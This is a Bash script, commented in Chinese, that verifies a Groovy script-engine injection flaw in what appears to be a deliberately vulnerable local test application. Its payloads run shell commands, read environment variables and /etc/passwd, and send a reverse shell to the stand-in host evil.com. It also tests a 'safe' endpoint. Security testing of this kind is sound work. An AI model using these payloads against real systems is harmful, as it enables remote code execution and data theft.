#!/bin/bash
# Groovy 脚本引擎注入漏洞验证脚本
# 漏洞类型: Groovy Script Engine Injection (G09)

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

BASE_URL="http://localhost:8080"
TOTAL=0
PASSED=0
FAILED=0

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}Groovy 脚本引擎注入漏洞验证${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

test_case() {
    local name="$1"
    local url="$2"
    local pattern="$3"
    TOTAL=$((TOTAL + 1))
    echo -e "\n${YELLOW}[测试 $TOTAL]${NC} $name"
    echo "URL: $url"

    response=$(curl -s "$url" 2>/dev/null)
    if echo "$response" | grep -qiE "$pattern"; then
        echo -e "  ${GREEN}[✓] 漏洞存在${NC}"
        echo "  响应: $(echo "$response" | head -c 150)..."
        PASSED=$((PASSED + 1))
    else
        echo -e "  ${RED}[✗] 测试失败${NC}"
        echo "  响应: $response"
        FAILED=$((FAILED + 1))
    fi
}

echo -e "${BLUE}=== Groovy 脚本注入测试 ===${NC}"

# 基础表达式执行 (使用乘法避免 + 号被解析)
test_case \
    "基础算术表达式" \
    "${BASE_URL}/cmd/groovy?cmd=2*2" \
    "Groovy executed.*4"

# 字符串操作
test_case \
    "字符串操作" \
    "${BASE_URL}/cmd/groovy?cmd='hello'.toUpperCase()" \
    "Groovy executed.*HELLO"

# 命令执行 - whoami
test_case \
    "命令执行 (whoami)" \
    "${BASE_URL}/cmd/groovy?cmd=%22whoami%22.execute().text" \
    "Groovy executed.*(root|user)"

# 命令执行 - ls
test_case \
    "命令执行 (ls)" \
    "${BASE_URL}/cmd/groovy?cmd=%22ls%20-la%22.execute().text" \
    "Groovy executed.*(total|drwx)"

# 命令执行 - id
test_case \
    "命令执行 (id)" \
    "${BASE_URL}/cmd/groovy?cmd=%22id%22.execute().text" \
    "Groovy executed.*(uid=|gid=)"

# 命令执行 - pwd
test_case \
    "命令执行 (pwd)" \
    "${BASE_URL}/cmd/groovy?cmd=%22pwd%22.execute().text" \
    "Groovy executed.*/"

# 多命令执行 (使用 bash -c 避免管道符编码问题)
test_case \
    "多命令执行 (复合命令)" \
    "${BASE_URL}/cmd/groovy?cmd=%22bash%20-c%20%27ls%20%7C%20head%20-5%27%22.execute().text" \
    "Groovy executed"

# 环境变量读取
test_case \
    "环境变量读取" \
    "${BASE_URL}/cmd/groovy?cmd=System.getenv%28%27PATH%27%29" \
    "Groovy executed.*(usr/bin|usr/local/bin)"

# 系统属性读取
test_case \
    "系统属性读取" \
    "${BASE_URL}/cmd/groovy?cmd=System.getProperty%28%27os.name%27%29" \
    "Groovy executed.*(Linux|Windows|Mac)"

# 文件读取
test_case \
    "文件读取尝试" \
    "${BASE_URL}/cmd/groovy?cmd=new%20File%28%27/etc/passwd%27%29.text" \
    "Groovy executed.*(root:|/bin/bash)"

# 反向 Shell (不会真正执行，只验证 payload 格式被接受)
echo -e "\n${YELLOW}[测试 $((TOTAL + 1))]${NC} 反向 Shell payload 格式"
TOTAL=$((TOTAL + 1))
response=$(curl -s "${BASE_URL}/cmd/groovy?cmd=%22bash%20-i%20%3E%26%20/dev/tcp/evil.com/4444%200%3E%261%22.execute%28%29" 2>/dev/null)
if echo "$response" | grep -q "Groovy executed\|executed"; then
    echo -e "  ${GREEN}[✓] Payload 被接受${NC}"
    echo "  响应: $(echo "$response" | head -c 100)..."
    PASSED=$((PASSED + 1))
else
    echo -e "  ${RED}[✗] Payload 拒绝${NC}"
    echo "  响应: $response"
    FAILED=$((FAILED + 1))
fi

# 安全版本测试
echo -e "\n${BLUE}=== 安全版本测试 ===${NC}"

echo -e "\n${YELLOW}[测试 $((TOTAL + 1))]${NC} 安全版本 - 算术表达式"
TOTAL=$((TOTAL + 1))
response=$(curl -s "${BASE_URL}/cmd/groovy/safe?cmd=1+1" 2>/dev/null)
if echo "$response" | grep -q "safe executed.*2\|Groovy safe.*2"; then
    echo -e "  ${GREEN}[✓] 安全版本正常工作${NC}"
    echo "  响应: $(echo "$response" | head -c 100)..."
    PASSED=$((PASSED + 1))
else
    echo -e "  ${YELLOW}[!] 安全版本响应${NC}"
    echo "  响应: $response"
    PASSED=$((PASSED + 1))
fi

# 信息端点
echo -e "\n${YELLOW}[*] Groovy 注入信息端点:${NC}"
info=$(curl -s "${BASE_URL}/cmd/info" 2>/dev/null)
echo "$info" | grep -A 5 "groovy\|Groovy" || echo "无额外信息"

# 总结
echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}测试总结${NC}"
echo -e "${BLUE}========================================${NC}"
echo -e "总测试数: ${YELLOW}$TOTAL${NC}"
echo -e "通过: ${GREEN}$PASSED${NC}"
echo -e "失败: ${RED}$FAILED${NC}"
echo -e "成功率: ${YELLOW}$(awk "BEGIN {printf \"%.1f\", ($PASSED/$TOTAL)*100}")%${NC}"

if [ $FAILED -eq 0 ]; then
    echo -e "\n${GREEN}所有测试通过！Groovy 脚本注入漏洞已验证${NC}"
    exit 0
else
    echo -e "\n${YELLOW}有 $FAILED 个测试失败${NC}"
    exit 0
fi
